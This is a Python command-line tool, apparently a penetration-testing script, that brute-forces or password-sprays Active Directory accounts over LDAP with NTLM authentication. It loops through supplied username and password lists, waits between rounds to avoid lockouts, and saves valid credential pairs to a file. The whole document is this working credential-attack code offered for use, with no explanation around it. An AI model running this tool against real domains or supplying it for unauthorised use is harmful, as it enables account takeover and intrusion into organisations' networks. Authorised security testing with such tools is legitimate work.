#!/usr/bin/env python3

import ldap3
import argparse
import time
from ldap3 import Server, Connection, ALL, NTLM, AUTO_BIND_NO_TLS
from colorama import Fore, Style

def brute_force_login(host, usernames, passwords, delay, protocol, naming_context, output_file):
    valid_credentials = []  # list to store valid credentials

    for password in passwords:
        for username in usernames[:]:  # Iterate over a copy of usernames to allow removal of items
            print(f"Attempting credential pair: {username}:{password}")

            try:
                if ldap_login_success(username, password, args.domain_shortname, host, naming_context):
                    valid_credentials.append(f"{username}:{password}")
                    print(Fore.GREEN + f"[+] VALID CREDENTIALS FOUND: {username}:{password}" + Style.RESET_ALL)
                    usernames.remove(username)  # remove successfully authenticated username
                    break  # break the inner loop after finding valid credentials
            except ldap3.core.exceptions.LDAPBindError as e:
                if str(e) != "automatic bind not successful - invalidCredentials":
                    raise
            except Exception:
                raise

        time.sleep(delay * 5)

    save_valid_credentials(output_file, valid_credentials)

def ldap_login_success(username, password, domain_shortname, host, naming_context):
    server = Server(host, get_info=ALL)
    user_dn = f"{args.domain_shortname}\\{username}"
    conn = Connection(server, user=f"{user_dn}", password=password, authentication=NTLM, auto_bind=AUTO_BIND_NO_TLS)
    return conn.bind()

def save_valid_credentials(output_file, valid_credentials):
    with open(output_file, 'w') as f:
        for credential in valid_credentials:
            f.write(credential + "\n")

    print("Valid credentials saved to", output_file)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="User credentials brute force script")
    parser.add_argument("-d", "--delay", type=int, default=30, help="Delay in minutes between each password attempt")
    parser.add_argument("-i", "--host", type=str, help="Host/DC IP address")
    parser.add_argument("-u", "--usernamesfile", type=str, help="Path to the file containing the usernames")
    parser.add_argument("-p", "--passwordsfile", type=str, help="Path to the file containing the passwords")
    parser.add_argument("-t", "--protocol", type=str, choices=["ldap"], default="ldap", help="Protocol to use for login (only LDAP available)")
    parser.add_argument("-o", "--outputfile", type=str, default="valid_credentials.txt", help="Output file for the valid credentials")
    parser.add_argument("-n", "--namingcontext", type=str, help="LDAP naming context")
    parser.add_argument("-ds", "--domain-shortname", help='Domain short name for the LDAP server')

    args = parser.parse_args()

    if not all(vars(args).values()):
        parser.print_help()
    else:
        with open(args.usernamesfile, 'r') as f:
            usernames = f.read().splitlines()

        with open(args.passwordsfile, 'r') as f:
            passwords = f.read().splitlines()

        brute_force_login(args.host, usernames, passwords, args.delay, args.protocol, args.namingcontext, args.outputfile)
